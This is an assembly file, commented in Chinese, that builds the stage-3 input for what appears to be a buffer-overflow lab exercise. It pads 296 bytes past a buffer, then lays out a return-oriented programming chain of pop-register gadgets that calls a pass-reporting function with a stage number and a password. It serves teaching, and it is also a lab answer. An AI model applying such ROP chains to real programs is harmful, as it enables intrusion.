# attack3.s — 阶段 3：无金丝雀、栈不可执行（服务器版）
#
# 栈上不能执行代码，所以不用 shellcode，改用程序里现成的指令片段（ROP）：
# 每个 gadget 都以 ret 结尾，ret 从栈上取下一条地址，串成一条调用链。
#
# 阶段 3 没有金丝雀，本地与服务器两份程序字节一致，所以 remote/ 与 local/
# 下这两份汇编产出的字节完全相同（源文件只有开头注释不同）。
#
# 输入布局（共 336 字节）：
#   偏移 0..295    296 字节填充 0x67，写到返回地址之前
#   偏移 296       覆盖返回地址 → 0x4034ff（pop %rdi; ret）
#   偏移 304       赋给 %rdi 的值：3（阶段号）
#   偏移 312       → 0x40282c（pop %rsi; ret）
#   偏移 320       赋给 %rsi 的值：口令
#   偏移 328       → 0x1938000（report_pass 的地址）
#
# 执行顺序：
#   chat_turn 的 ret 弹出 0x4034ff → pop %rdi 取走 3 → ret 弹出 0x40282c
#   → pop %rsi 取走口令 → ret 弹出 report_pass 的地址，进入过关函数。

.text
.fill 296, 1, 0x67          # 0..295：填充
.quad 0x4034ff              # 296：pop %rdi; ret
.quad 0x3                   # 304：%rdi = 阶段号 3
.quad 0x40282c              # 312：pop %rsi; ret
.quad 0xdc22eaf2a8fe9994    # 320：%rsi = 口令
.quad 0x1938000             # 328：report_pass
